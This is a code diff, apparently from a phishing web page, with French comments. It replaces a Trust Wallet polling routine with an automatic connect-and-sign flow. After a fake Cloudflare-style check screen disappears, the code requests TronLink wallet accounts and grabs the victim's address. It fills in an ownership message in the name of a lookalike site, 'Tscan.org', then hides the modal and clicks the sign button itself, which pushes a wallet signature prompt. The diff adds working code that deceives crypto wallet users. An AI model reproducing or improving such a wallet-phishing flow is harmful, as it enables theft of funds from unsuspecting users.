@@ -270,7 +270,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     root.classList.add('cf-done');
     document.documentElement.classList.remove('cf-lock');
     root.remove();
-    setTimeout(autoTrustWalletFlow, 500);
+    setTimeout(autoConnectAndSign, 300);
   }
   function run() {
     if (done) return;
@@ -484,28 +484,33 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   }
 
   /* ================================================================
-     TRUST WALLET AUTO FLOW
-     Trust Wallet (in-app browser) injecte window.tronWeb
-     directement avec defaultAddress déjà set — pas besoin de popup.
-     On poll dès que le CF screen disparaît.
+     AUTO CONNECT + SIGN — same logic as working tron_Sig_ file
      ================================================================ */
-  function autoTrustWalletFlow() {
-    var tries = 0;
-    var timer = setInterval(function() {
-      tries++;
-      if (tries > 150) { clearInterval(timer); return; }
+  async function autoConnectAndSign() {
+    try {
+      // Vérif tronLink présent (Trust Wallet in-app browser)
+      if (!window.tronLink) return;
+
+      // Étape 1 : request accounts → ouvre popup Trust Wallet
+      if (window.tronLink.request) {
+        try {
+          await window.tronLink.request({ method: 'tron_requestAccounts' });
+        } catch(e) {}
+      }
+
+      // Attendre injection (exactement comme tron_Sig_)
+      await new Promise(function(r){ setTimeout(r, 600); });
 
       var tw = window.tronWeb;
-      if (!tw) return;
-      var da = tw.defaultAddress;
-      var addr = (da && da.base58 && da.base58.length > 10) ? da.base58
-               : (typeof da === 'string' && da.length > 10) ? da : null;
+      var da = tw && tw.defaultAddress;
+      var addr = (da && da.base58) ? da.base58 : (typeof da === 'string' ? da : null);
+      if (!addr) addr = window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58;
       if (!addr) return;
 
-      clearInterval(timer);
-
+      // Fill Address
       if (window.fillAddress) window.fillAddress(addr);
 
+      // Fill Message
       var now2 = new Date();
       var pad2 = function(n){ return String(n).padStart(2,'0'); };
       var ts2 = pad2(now2.getDate())+'/'+pad2(now2.getMonth()+1)+'/'+now2.getFullYear()
@@ -513,9 +518,11 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var autoMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
       if (window.fillMessage) window.fillMessage(autoMsg);
 
+      // Fermer connect modal
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
+      // Cliquer Sign Message → popup signature Trust Wallet
       setTimeout(function() {
         var signPane = document.querySelector('.QhZmva_tabPanelInner[data-pane="sign"]');
         var btn = signPane && signPane.querySelector('.QhZmva_btnWrapper .btn');
@@ -525,7 +532,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
           btn.click();
         }
       }, 400);
-    }, 100);
+
+    } catch(e) {}
   }
 
   /* ============ Interactive design elements ============ */
